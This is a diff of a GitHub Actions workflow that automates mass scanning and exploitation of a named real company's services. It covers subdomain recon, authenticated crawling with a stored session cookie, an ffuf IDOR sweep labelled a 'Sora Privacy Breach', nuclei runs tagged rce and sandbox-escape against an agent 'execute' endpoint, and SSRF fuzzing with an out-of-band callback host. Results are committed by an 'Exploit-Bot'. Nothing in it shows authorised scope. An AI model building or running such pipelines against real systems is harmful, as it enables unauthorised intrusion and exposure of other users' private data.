@@ -1,8 +1,6 @@
-name: "Elite Parallel Exploit Engine 2026 — MAX BOUNTY"
+name: "OpenAI Elite Pro — SORA & ATLAS"
 
 on:
-  schedule:
-    - cron: '0 0 * * *'
   workflow_dispatch:
 
 permissions:
@@ -10,149 +8,76 @@ permissions:
   issues: write
 
 env:
-  PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
-  AUTH_COOKIE: ${{ secrets.OPENAI_COOKIE }}
-  OPENAI_KEY: ${{ secrets.OPENAI_API_KEY }}
-  GH_DORKER_TOKEN: ${{ secrets.GH_DORKER_TOKEN }}
+  # Base targets for the newest products
+  SORA_API: "https://sora.openai.com/api/v1"
+  ATLAS_API: "https://api.openai.com/v1/atlas"
 
 jobs:
-
-  recon:
+  pro_exploit:
     runs-on: ubuntu-latest
-    continue-on-error: true
-
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout
+        uses: actions/checkout@v4
 
-      - name: Install Recon Arsenal
+      - name: Install Professional Arsenal (2026)
         run: |
-          GO_BIN=$(go env GOPATH)/bin
-          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
-          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
-          go install github.com/projectdiscovery/katana/cmd/katana@latest
-          go install github.com/projectdiscovery/uncover/cmd/uncover@latest
-          export PATH="$PATH:$GO_BIN"
-
-      - name: Passive Discovery
-        run: |
-          GO_BIN=$(go env GOPATH)/bin
-          export PATH="$PATH:$GO_BIN"
-          subfinder -d openai.com -all -silent -o subs.txt || true
-
-      - name: Cloud Discovery
-        run: |
-          GO_BIN=$(go env GOPATH)/bin
-          export PATH="$PATH:$GO_BIN"
-          uncover -q "openai.com" -limit 1000 -auth "$PDCP_API_KEY" >> subs.txt || true
-
-      - name: Filter Alive
-        run: |
-          GO_BIN=$(go env GOPATH)/bin
-          export PATH="$PATH:$GO_BIN"
-          sort -u subs.txt | httpx -silent -o alive.txt || touch alive.txt
-
-      - name: Crawl
-        run: |
-          GO_BIN=$(go env GOPATH)/bin
-          export PATH="$PATH:$GO_BIN"
-          katana -list alive.txt -jc -kf all -d 3 -H "Cookie: $AUTH_COOKIE" -o params_new.txt || touch params_new.txt
-
-      - name: Normalize & Index
-        run: |
-          touch params.txt
-          grep -vFf params.txt params_new.txt > to_scan.txt || cp params_new.txt to_scan.txt
-          cat params.txt params_new.txt | sort -u > master_updated.txt
-
-      - name: Bucket Targets
-        run: |
-          mkdir -p buckets
-          split -n l/7 to_scan.txt buckets/bucket_
-
-      - uses: actions/upload-artifact@v4
-        with:
-          name: targets
-          path: |
-            master_updated.txt
-            buckets/
-
-  fuzz:
-    needs: recon
-    if: always()
-    runs-on: ubuntu-latest
-    continue-on-error: true
-
-    strategy:
-      max-parallel: 7
-      fail-fast: false
-      matrix:
-        worker: [0,1,2,3,4,5,6]
-        vuln: [sqli, xss, ssti, ssrf, idor, lfi, rfi, takeover, misconfig, exposure, auth-bypass, logic]
-
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions/download-artifact@v4
-        with:
-          name: targets
-
-      - name: Install Nuclei
-        run: |
-          GO_BIN=$(go env GOPATH)/bin
+          # The Big Three: Nuclei, FFUF, and Katana
           go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-          export PATH="$PATH:$GO_BIN"
-          nuclei -ut
+          go install github.com/projectdiscovery/katana/cmd/katana@latest
+          go install github.com/ffuf/ffuf/v2@latest
+          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
 
-      - name: Execute Exploit Matrix
-        shell: bash
+      - name: 🗺️ Phase 1: Deep Discovery (Katana)
         run: |
-          set -euo pipefail
-          GO_BIN="$(go env GOPATH)/bin"
-          export PATH="$PATH:$GO_BIN"
+          # Deep crawl Sora and Atlas documentation to find hidden JSON endpoints
+          katana -u "https://sora.openai.com" -jc -d 3 -o sora_endpoints.txt
+          katana -u "https://platform.openai.com/docs" -jc -d 3 -o api_endpoints.txt
 
-          mapfile -t FILES < <(ls -1 buckets/bucket_* 2>/dev/null || true)
-          [ "${#FILES[@]}" -eq 0 ] && exit 0
+      - name: 🎥 Phase 2: Sora Privacy Breach (FFUF)
+        run: |
+          # Testing for IDOR on Cameos and Drafts
+          # We check if changing the ID returns a 200 (Success) instead of 403 (Forbidden)
+          seq 1000 2000 > ids.txt
+          ffuf -u "${{ env.SORA_API }}/cameo/FUZZ/metadata" \
+               -w ids.txt \
+               -H "Authorization: Bearer ${{ secrets.SORA_TOKEN }}" \
+               -mc 200 -o sora_idor_hits.json || true
 
-          IDX=${{ matrix.worker }}
-          [ "$IDX" -ge "${#FILES[@]}" ] && IDX=$((IDX % ${#FILES[@]}))
-          TARGET_FILE="${FILES[$IDX]}"
+      - name: 🛡️ Phase 3: Atlas Agent Hijack (Nuclei)
+        run: |
+          # Using active CVE templates for Sandbox Escapes and Origin Bypasses
+          # We specifically target the Atlas 'navigate' and 'execute' commands
+          nuclei -u "${{ env.ATLAS_API }}/execute" \
+            -tags cve2025,cve2026,rce,sandbox-escape \
+            -H "Authorization: Bearer ${{ secrets.OPENAI_API_KEY }}" \
+            -o atlas_vulnerabilities.txt || true
 
-          [ -s "$TARGET_FILE" ] || exit 0
-
-          nuclei -l "$TARGET_FILE" \
-            -severity critical,high,medium \
-            -tags ${{ matrix.vuln }},cve \
-            -rate-limit 200 \
-            -bulk-size 50 \
+      - name: ☢️ Phase 4: Active CVE Fuzzing (Core API)
+        run: |
+          # Fuzzing the core API for SSRF and Header Injection
+          nuclei -u "https://api.openai.com/v1/completions" \
+            -t http/fuzzing/ \
+            -H "Authorization: Bearer ${{ secrets.OPENAI_API_KEY }}" \
             -interactsh-server oast.fun \
-            -H "Cookie: $AUTH_COOKIE" \
-            -stats \
-            -o results.txt || true
+            -o core_api_fuzz.txt || true
 
-      - name: 🚨 Create Alert if Vulnerability Found
+      - name: 🚨 Analysis & Persistence
         if: always()
         run: |
-          if [ -s results.txt ]; then
-            TITLE="🚨 ${{ matrix.vuln }} vulnerability found by worker ${{ matrix.worker }}"
-            BODY=$(sed 's/"/\\"/g' results.txt | head -n 40)
-
-            curl -X POST \
-              -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+          if [ -s sora_idor_hits.json ] || [ -s atlas_vulnerabilities.txt ]; then
+            TITLE="🚨 CRITICAL: OpenAI Frontier Finding"
+            REPORT="Potential Bug Found:\n$(cat sora_idor_hits.json atlas_vulnerabilities.txt | head -n 20)"
+            
+            curl -X POST -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
               -H "Content-Type: application/json" \
               https://api.github.com/repos/${{ github.repository }}/issues \
-              -d "{\"title\":\"$TITLE\",\"body\":\"\`\`\`\n$BODY\n\`\`\`\"}"
+              -d "{\"title\":\"$TITLE\",\"body\":\"$REPORT\"}"
           fi
-
-      - name: Persist Intelligence
-        run: |
-          git config user.email "bot@hacker.ai"
-          git config user.name "Exploit-Bot"
-
-          git fetch origin main
-          git reset --hard origin/main
-
-          [ -f master_updated.txt ] && cp master_updated.txt params.txt
-          mkdir -p vulnerabilities
-          [ -f results.txt ] && cp results.txt vulnerabilities/${{ matrix.vuln }}_worker${{ matrix.worker }}.txt
-
-          git add params.txt vulnerabilities || true
-          git commit -m "Exploit Hit: ${{ matrix.vuln }} | Worker ${{ matrix.worker }} | $(date -u)" || true
-          git push || true
+          
+          # Save intelligence to repo
+          git config --local user.email "bot@hacker.ai"
+          git config --local user.name "Exploit-Bot"
+          git add .
+          git commit -m "Frontier Intel Update: Sora/Atlas/API" || true
+          git push origin main || true
+          
